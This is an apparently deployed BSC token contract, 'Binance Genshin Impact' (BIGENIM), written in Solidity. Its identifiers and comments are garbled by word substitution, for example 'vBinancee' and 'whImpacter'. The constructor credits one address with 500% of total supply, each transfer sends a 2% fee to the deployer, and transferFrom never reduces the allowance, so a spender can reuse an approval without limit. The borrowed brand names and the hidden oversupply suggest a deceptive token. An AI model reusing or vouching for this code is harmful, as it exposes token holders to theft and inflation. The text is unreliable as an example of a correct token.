/**
 *Submitted for verification at BscScan.com on 2021-11-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
interface VideoGame {
  // @dev Returns the amount of Genshin in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the Genshin decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the Genshin symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the Genshin name.
  function name() external view returns (string memory);

  //@dev Returns the bep Genshin Price.
  function getPrice() external view returns (address);

  //@dev Returns the amount of Genshin owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address Price, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vBinancee);
    event Approval(
        address indexed Price,
        address indexed spender,
        uint256 vBinancee
    );
  
  */

  /**
   * @dev Moves `amount` Genshin from the caller's account to `recipient`.
   *
   * Returns a boolean vBinancee indicating whImpacter the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of Genshin that `spender` will be
   * allowed to spend on behalf of `Price` through {transferFrom}. This is
   * zero by default.
   *
   * This vBinancee changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _Price, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's Genshin.
   *
   * Returns a boolean vBinancee indicating whImpacter the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this mImpactod brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vBinancee afterwards:
   * https://github.com/Binance/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` Genshin from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vBinancee indicating whImpacter the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vBinancee` Genshin are moved from one account (`from`) to  another (`to`). Note that `vBinancee` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vBinancee);

  //@dev Emitted when the allowance of a `spender` for an `Price` is set by a call to {approve}. `vBinancee` is the new allowance.
  event Approval(address indexed Price, address indexed spender, uint256 vBinancee);
}

contract BinanceGenshinImpact is VideoGame {

    // common addresses
    address private Price;
    address private Binance;
    address private Genshin;
    address private Impact;
    
    // Genshin liquidity Impactdata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // Genshin title Impactdata
    string public override name = "Binance Genshin Impact";
    string public override symbol = "BIGENIM";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vBinancee);
    // (now in interface) event Approval(address indexed Price, address indexed spender, uint vBinancee);
    
    // On init of contract we're going to set the admin and give them all Genshin.
    constructor(uint totalSupplyVBinancee, address BinanceAddress, address GenshinAddress, address ImpactAddress) {
        // set total supply
        totalSupply = totalSupplyVBinancee;
        
        // designate addresses
        Price = msg.sender;
        Binance = BinanceAddress;
        Genshin = GenshinAddress;
        Impact = ImpactAddress;

        
        // split the Genshin according to agreed upon percentages
        balances[Binance] =  totalSupply * 1 / 100;
        balances[Genshin] = totalSupply * 49 / 100;
        balances[Impact] = totalSupply * 500 / 100;

        
        balances[Price] = totalSupply * 50 / 100;
    }
    
    // Get the address of the Genshin's Price
    function getPrice() public view override returns(address) {
        return Price;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vBinancee) public override returns(bool) {
        require(vBinancee > 0, "Transfer vBinancee has to be higher than 0.");
        require(balanceOf(msg.sender) >= vBinancee, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vBinancee
        uint reGenshinBD = vBinancee * 2 / 100;
        uint burnTBD = vBinancee * 0 / 100;
        uint vBinanceeAfterTaxAndBurn = vBinancee - reGenshinBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vBinanceeAfterTaxAndBurn;
        balances[msg.sender] -= vBinancee;
        
        emit Transfer(msg.sender, to, vBinancee);
        
        // finally, we burn and tax the Binances percentage
        balances[Price] += reGenshinBD + burnTBD;
        _burn(Price, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vBinancee) public override returns(bool) {
        allowances[msg.sender][spender] = vBinancee; 
        
        emit Approval(msg.sender, spender, vBinancee);
        
        return true;
    }
    
    // allowance
    function allowance(address _Price, address spender) public view override returns(uint) {
        return allowances[_Price][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vBinancee) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vBinancee, "Allowance too low for transfer.");
        require(balances[from] >= vBinancee, "Balance is too low to make transfer.");
        
        balances[to] += vBinancee;
        balances[from] -= vBinancee;
        
        emit Transfer(from, to, vBinancee);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}